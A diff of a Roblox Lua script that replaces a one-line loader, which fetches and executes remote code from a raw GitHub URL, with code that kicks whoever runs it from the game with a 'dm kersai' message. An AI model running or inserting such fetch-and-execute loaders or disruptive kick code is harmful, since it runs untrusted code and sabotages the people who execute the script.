@@ -1,1 +1,6 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ryansmainblatant/LOOAAL/refs/heads/main/BRUTAL"))()
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+if localPlayer then
+    localPlayer:Kick("dm kersai")
+end
